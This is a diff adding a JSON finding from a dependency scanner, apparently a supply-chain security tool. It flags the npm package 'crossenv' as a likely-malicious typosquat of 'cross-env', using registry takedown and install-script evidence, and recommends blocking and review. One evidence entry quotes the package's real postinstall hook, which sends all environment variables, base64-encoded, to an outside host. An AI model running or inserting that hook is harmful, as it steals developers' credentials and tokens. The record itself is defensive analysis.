@@ -1,0 +1,133 @@
+{
+  "schema": "guardian.investigation/v1",
+  "finding": {
+    "id": "GRD-d2c4aa3ad1",
+    "rule": "TYPOSQUAT",
+    "category": "typosquat",
+    "title": "Possible typosquat: 'crossenv' looks like 'cross-env'",
+    "severity": "high"
+  },
+  "component": {
+    "id": "pkg:npm/crossenv@6.1.1",
+    "name": "crossenv",
+    "version": "6.1.1",
+    "ecosystem": "npm",
+    "direct": true,
+    "scope": "dev"
+  },
+  "generated_at": "2026-11-24T04:54:29Z",
+  "verified_evidence": [
+    {
+      "id": "F1",
+      "kind": "name-similarity",
+      "source": "guardian popular-package list:node_modules/crossenv",
+      "detail": "'crossenv' resembles popular package 'cross-env' (same name after separator/homoglyph normalisation)"
+    },
+    {
+      "id": "F2",
+      "kind": "context",
+      "source": "inventory",
+      "detail": "the legitimate 'cross-env' is also in this dependency tree"
+    },
+    {
+      "id": "F3",
+      "kind": "install-script",
+      "source": "package-lock.json",
+      "detail": "package runs an install-time script (hasInstallScript)"
+    },
+    {
+      "id": "F4",
+      "kind": "registry-metadata",
+      "source": "registry.npmjs.org",
+      "detail": "npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code"
+    },
+    {
+      "id": "F5",
+      "kind": "dependency-path",
+      "source": "dependency graph",
+      "detail": "shop-api@1.4.0 > crossenv@6.1.1"
+    },
+    {
+      "id": "F6",
+      "kind": "baseline-diff",
+      "source": "baseline",
+      "detail": "'crossenv' did not exist in the trusted baseline; it is new"
+    },
+    {
+      "id": "F7",
+      "kind": "manifest",
+      "source": "package.json",
+      "detail": "declared as crossenv: ^6.1.1 (devDependencies)"
+    },
+    {
+      "id": "F8",
+      "kind": "install-script",
+      "source": "node_modules/crossenv/package.json",
+      "detail": "postinstall: node -e \"require('http').request({host:'npm.hacktask.net',path:'/log/?'+Buffer.from(JSON.stringify(process.env)).toString('base64')}).end()\""
+    },
+    {
+      "id": "F9",
+      "kind": "registry",
+      "source": "registry.npmjs.org",
+      "detail": "latest dist-tag: 0.0.2-security; 4 versions published"
+    },
+    {
+      "id": "F10",
+      "kind": "registry",
+      "source": "registry.npmjs.org",
+      "detail": "package has been replaced by an npm security placeholder (taken down)"
+    },
+    {
+      "id": "F11",
+      "kind": "registry",
+      "source": "registry.npmjs.org",
+      "detail": "package first published 2017-07-19"
+    },
+    {
+      "id": "F12",
+      "kind": "registry",
+      "source": "registry.npmjs.org",
+      "detail": "version 6.1.1 published 2017-07-19"
+    },
+    {
+      "id": "F13",
+      "kind": "registry",
+      "source": "registry.npmjs.org",
+      "detail": "version 6.1.1 is not available on the registry"
+    },
+    {
+      "id": "F14",
+      "kind": "provenance",
+      "source": "registry.npmjs.org",
+      "detail": "source repository: git+https://github.com/npm/security-holder.git"
+    },
+    {
+      "id": "F15",
+      "kind": "git-history",
+      "source": "git log package-lock.json",
+      "detail": "no history available (shallow clone or untracked file)"
+    }
+  ],
+  "inference": {
+    "by": "rule-based",
+    "hypothesis": "The package matches known-malicious signals (registry take-down and/or data-exfiltration script).",
+    "assessment": "Rule-based inference from the verified facts; no AI model was used.",
+    "verdict": "likely-malicious",
+    "cited_facts": [
+      "F1",
+      "F2",
+      "F3",
+      "F4",
+      "F5",
+      "F6"
+    ],
+    "missing_evidence": [],
+    "next_steps": [
+      "block the component in policy until reviewed",
+      "restore from the trusted baseline / pin to a reviewed commit",
+      "escalate to security review"
+    ],
+    "confidence": "medium"
+  },
+  "note": "verified_evidence comes from deterministic sources; inference is model/rule output and must be reviewed"
+}
